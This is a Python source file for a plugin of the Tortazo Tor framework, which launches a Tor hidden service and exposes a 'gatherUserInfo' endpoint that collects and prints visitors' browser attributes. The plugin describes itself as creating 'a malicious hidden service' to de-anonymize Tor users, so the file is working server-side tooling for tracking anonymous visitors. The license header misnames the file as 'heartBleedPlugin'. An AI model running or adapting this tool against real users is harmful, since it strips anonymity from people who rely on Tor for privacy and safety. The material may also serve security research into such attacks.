# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

maliciousHiddenServicePlugin.py

maliciousHiddenServicePlugin is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

heartBleedPlugin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

from core.tortazo.pluginManagement.BasePlugin import BasePlugin
from plugins.texttable import Texttable
import functools
import tempfile
from twisted.web import server, resource, static
from twisted.internet import reactor
import txtorcon
import os
from twisted.internet.endpoints import TCP4ServerEndpoint
import json

class GatherInformation(resource.Resource):

    def render_GET(self, request):
        data = json.loads(request.args['info'][0])
        if data != None:
            table = Texttable()
            table.set_cols_align(["l", "l"])
            table.set_cols_valign(["m", "m"])
            table.set_cols_width([40,55])
            rows= [ ["Browser Attribute", "Value"],
                  ]
            for key, value in data.iteritems():
                rows.append([key, value])
            table.add_rows(rows)
            print table.draw() + "\n"

        request.setHeader("content-type", "text/plain")
        return "Success"


class maliciousHiddenServicePlugin(BasePlugin):
    def __init__(self, torNodes=[]):
        BasePlugin.__init__(self, torNodes, 'maliciousHiddenServicePlugin')
        self.setPluginDetails('maliciousHiddenServicePlugin', 'Creates a malicious hidden service in TOR network and tries to de-anonimyze the users.', '1.0', 'Adastra: @jdaanial')
        if len(torNodes) > 0:
            self.info("[*] maliciousHiddenServicePlugin Initialized!")

    def __del__(self):
        if len(self.torNodes) > 0:
            self.info("[*] maliciousHiddenServicePlugin Destroyed!")


    def __updates(self,prog, tag, summary):
        print "%d%%: %s" % (prog, summary)


    def __setup_complete(self, configTor, proto):
        print "[+] TOR Startup completed!"
        onion_address = configTor.HiddenServices[0].hostname
        print "[+] Hidden service running at: "
        print "http://%s (port %d)" % (onion_address, self.hiddenservicePort)
        print "[+] Directory for the hidden service is at:", configTor.HiddenServices[0].dir
        print "[+] you should be able to visit it via: torsocks lynx http://%s" % onion_address


    def __setup_failed(self,arg):
        print "SETUP FAILED", arg
        reactor.stop()

    def __createTemporal(self):
        tempDir = tempfile.mkdtemp(prefix='torhiddenservice')
        reactor.addSystemEventTrigger('before', 'shutdown', functools.partial(txtorcon.util.delete_file_or_tree, tempDir))
        return tempDir

    #chromium-browser --proxy-server=socks5://127.0.0.1:9150
    def startHTTPHiddenService(self, serviceDir, servicePort=8080, hiddenserviceDir=None, hiddenservicePort=80, serviceInterface='127.0.0.1', socksPort=9152, orPort=9000):
        self.hiddenservicePort = hiddenservicePort
        config = txtorcon.TorConfig()
        config.SOCKSPort = socksPort
        config.ORPort = orPort
        if hiddenserviceDir is None:
            print "[+] HiddenServiceDir not specified... Generating a temporal file."
            hiddenserviceDir = self.__createTemporal()

        if os.path.exists(hiddenserviceDir) == False:
            print "[+] The HiddenServiceDir specified does not exists... Generating a temporal file."
            hiddenserviceDir = self.__createTemporal()

        if os.path.exists(serviceDir) == False:
            print "[-] The specified Server directory is not valid. You must specify a valid directory where resources like HTML pages, images, CSS and stuff like that are located. The directory will be used to start a simple HTTP Server."
            return


        config.HiddenServices = [txtorcon.HiddenService(config, hiddenserviceDir, ["%s %s:%s" %(str(hiddenservicePort), serviceInterface, str(servicePort))] )]
        config.save()

        root = static.File(serviceDir)
        root.putChild("gatherUserInfo", GatherInformation())
        site = server.Site(root)
        hs_endpoint = TCP4ServerEndpoint(reactor, servicePort, interface=serviceInterface)
        hs_endpoint.listen(site)

        d = txtorcon.launch_tor(config, reactor, progress_updates=self.__updates)
        d.addCallback(functools.partial(self.__setup_complete, config))
        d.addErrback(self.__setup_failed)
        reactor.run()


    def help(self):
        print "[*] Functions availaible available in the Plugin..."
        table = Texttable()
        table.set_cols_align(["l", "l", "c"])
        table.set_cols_valign(["m", "m", "m"])
        table.set_cols_width([40,55,55])
        table.add_rows([ ["Function", "Description", "Example"],
                         ['help', 'Help Banner', 'self.help()'],
                         ['startHTTPHiddenService', 'Starts a hidden service with the specified settings. serviceDir=Directory where the resources are located (html pages, js script, css, images, etc.) ', '']
                        ])
        print table.draw() + "\n"